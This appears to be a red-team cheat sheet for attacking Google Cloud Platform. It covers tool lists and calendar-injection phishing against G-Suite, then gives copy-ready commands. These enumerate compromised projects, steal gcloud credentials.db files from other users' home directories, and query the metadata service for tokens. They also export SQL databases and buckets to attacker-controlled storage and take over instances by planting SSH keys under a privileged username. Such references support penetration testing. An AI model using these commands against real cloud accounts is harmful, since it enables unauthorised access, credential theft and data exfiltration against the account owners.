# GCP

## General

```text
**Tools**
# Hayat https://github.com/DenizParlak/hayat
# GCPBucketBrute https://github.com/RhinoSecurityLabs/GCPBucketBrute
# GCP IAM https://github.com/marcin-kolda/gcp-iam-collector
# GCP Firewall Enum: https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_firewall_enum

Auth methods:
• Web Access
• API – OAuth 2.0 protocol
• Access tokens – short lived access tokens for service accounts
• JSON Key Files – Long-lived key-pairs
• Credentials can be federated

Recon:
• G-Suite Usage
   ◇ Try authenticating with a valid company email address at Gmail

Google Storage Buckets:
• Google Cloud Platform also has a storage service called “Buckets”
• Cloud_enum from Chris Moberly (@initstring) https://github.com/initstring/cloud_enum
   ◇ Awesome tool for scanning all three cloud services for buckets and more
      ▪ Enumerates:
         - GCP open and protected buckets as well as Google App Engine sites
         - Azure storage accounts, blob containers, hosted DBs, VMs, and WebApps
         - AWS open and protected buckets

Phising G-Suite:
• Calendar Event Injection
• Silently injects events to target calendars
• No email required
• Google API allows to mark as accepted
• Bypasses the “don’t auto-add” setting
• Creates urgency w/ reminder notification
• Include link to phishing page

Steal Access Tokens:
• Google JSON Tokens and credentials.db
• JSON tokens typically used for service account access to GCP
• If a user authenticates with gcloud from an instance their creds get stored here:
    ~/.config/gcloud/credentials.db
    sudo find /home -name "credentials.db"
• JSON can be used to authenticate with gcloud and ScoutSuite

Post-compromise
• Cloud Storage, Compute, SQL, Resource manager, IAM
• ScoutSuite from NCC group https://github.com/nccgroup/ScoutSuite
• Tool for auditing multiple different cloud security providers
• Create Google JSON token to auth as service account
```

## Enumeration

```text
# Authentication with gcloud and retrieve info
gcloud auth login
gcloud auth activate-service-account --key-file creds.json
gcloud auth activate-service-account --project=<projectid> --key-file=filename.json
gcloud auth list
gcloud init
gcloud config configurations activate stolenkeys
gcloud config list
gcloud organizations list
gcloud organizations get-iam-policy <org ID>
gcloud projects get-iam-policy <project ID>
gcloud iam roles list  --project=<project ID>
gcloud beta asset search-all-iam-policies --query policy:"projects/xxxxxxxx/roles/CustomRole436" --project=xxxxxxxx
gcloud projects list
gcloud config set project <project name>
gcloud services list
gcloud projects list
gcloud config set project [Project-Id]
gcloud source repos list
gcloud source repos clone <repo_name>

# Virtual Machines
gcloud compute instances list
gcloud compute instances list --impersonate-service-account AccountName
gcloud compute instances list --configuration=stolenkeys
gcloud compute instances describe <instance id>
gcloud compute instances describe <InstanceName> --zone=ZoneName --format=json | jq -c '.serviceAccounts[].scopes[]'
gcloud beta compute ssh --zone "<region>" "<instance name>" --project "<project name>"
# Puts public ssh key onto metadata service for project
gcloud compute ssh <local host>
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H &#39;Metadata-Flavor:Google’
# Use Google keyring to decrypt encrypted data
gcloud kms decrypt --ciphertext-file=encrypted-file.enc --plaintext-file=out.txt --key <crypto-key> --keyring <crypto-keyring> --location global

# Storage Buckets
List Google Storage buckets
gsutil ls
gsutil ls -r gs://<bucket name>
gsutil cat gs://bucket-name/anyobject
gsutil cp gs://bucketid/item ~/

# Webapps & SQL
gcloud app instances list
gcloud sql instances list
gcloud spanner instances list
gcloud bigtable instances list
gcloud sql databases list --instance <instance ID>
gcloud spanner databases list --instance <instance name>

# Export SQL databases and buckets
# First copy buckets to local directory
gsutil cp gs://bucket-name/folder/ .
# Create a new storage bucket, change perms, export SQL DB
gsutil mb gs://<googlestoragename>
gsutil acl ch -u <service account> gs://<googlestoragename>
gcloud sql export sql <sql instance name> gs://<googlestoragename>/sqldump.gz --database=<database name>

# Networking
gcloud compute networks list
gcloud compute networks subnets list
gcloud compute vpn-tunnels list
gcloud compute interconnects list
gcloud compute firewall-rules list
gcloud compute firewall-rules describe <rulename>

# Containers
gcloud container clusters list
# GCP Kubernetes config file ~/.kube/config gets generated when you are authenticated with
gcloud container clusters get-credentials <cluster name> --region <region>
kubectl cluster-info

# Serverless (Lambda functions)
gcloud functions list
gcloud functions describe <function name>
gcloud functions logs read <function name> --limit <number of lines>
# Gcloud stores creds in ~/.config/gcloud/credentials.db Search home directories
sudo find /home -name "credentials.db
# Copy gcloud dir to your own home directory to auth as the compromised user
sudo cp -r /home/username/.config/gcloud ~/.config
sudo chown -R currentuser:currentuser ~/.config/gcloud
gcloud auth list

# Databases
gcloud sql databases list
gcloud sql backups list --instance=test

# Metadata Service URL
# metadata.google.internal = 169.254.169.254
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H
"Metadata-Flavor: Google"

# Interesting metadata instance urls:
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Get access scope
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'

# Get snapshot from instance and create instance from it
gcloud compute snapshots list
gcloud compute instances create instance-2 --source-snapshot=snapshot-1 --zone=us-central1-a
```

## Attacks

```text
# Check ssh keys attached to instance
gcloud compute instances describe instance-1 --zone=us-central1-a --format=json | jq '.metadata.items[].value'
# Check for "privilegeduser:ssh-rsa" and generate ssh keys with same username and paste in file
ssh-keygen -t rsa -C "privilegeduser" -f ./underprivuser 
# Something like:
privilegeduser:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFGrK8V2k0xBeSzN+oUgnRLSIgUED7ayeUJJ10ryEFR0xJbFeGsRAL5LUzw1DTT9gRKmcMTjmZNU3E99bwyytV0fLnGVRIZ63oC8IdTESR0g8EnU6yam/ntq6gZF5QRcES3gaZlnssOQQhw0rvcCB7o5oM1zCDQtgJXAu/2UI6yKf3xdlcHdrULbKTR+0c7r2FWMLgdghGsA+yH3leHJWjDE/WJ1mqf+ZE+RvwLZ8TmVFJmI37xoKEeVnkmOrOe/TMYvtuzSQduHEUhhfjB8YPUYH7dGHyVPlRp/0Hsrjauf5//zNN9dyAZisElgF7CnJmtJVizfDxlXd/nwrVC8nf2xzbi8nc24STfTg3+lR1f73Z5xN9waPl3eHMNy7nXvShxSO01ZwwuyTmjNh83ik1PJjNU= privilegeduser
privilegeduser:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnLriKvJcwZ2eRUbYpy7ZiZrZub+ZblHgKhATPnRjEXK7Q5U3vOFutCeMavxQ82yIwne6b6LzDAfKeS6wlez1ll2npGhKpb8mAM+ZIKxdTAoAhenOlLlmMyYHhJs/UjkTtj7TZDIEa/uZjZgClK5fmgkYjprsRbPOtAru8fBAOAWfMtrXYFmUJy94iMIvYpRuUPTZ0XUkzmyETNspZOwoOd+K2yTmFor4mWIgTzbaeAtJA+b+nQmXM1Ya1RfalpQsomXnkhqihh/wmqJMDGIJT1YgepMxbj4wy5WyUlE4Ub+/Wh7Lyu51jaRJ++FYh/pgb3m3d8t7B6b2Jj7ldxicQSPu6Mc9TZ5QrPx91dOe/Mzmte2kW7AF8xXo+Se71Ffc5csupUo62uyeXt12F+qNiqHeJXSomxck7rRwonnUhyNJ2icCPogsbDNDjHvdXmGsrXNFU= privilegeduser
# Upload the file with the 2 keys and access to the instance
gcloud compute instances add-metadata instance-1 --metadata-from-file ssh-keys=keys.txt --zone us-central1-a
ssh -i underprivuser privilegeduser@xx.xx.xx.xx

# Re-authentication the account keys
# Find keys in instance
cd /home/<username>/.config/gcloud
cat credentials.db
# Copy the credentials, make a new json file inside your computer and paste it.
gcloud auth activate-service-account --key-file <file>.json
# Now can access API
```



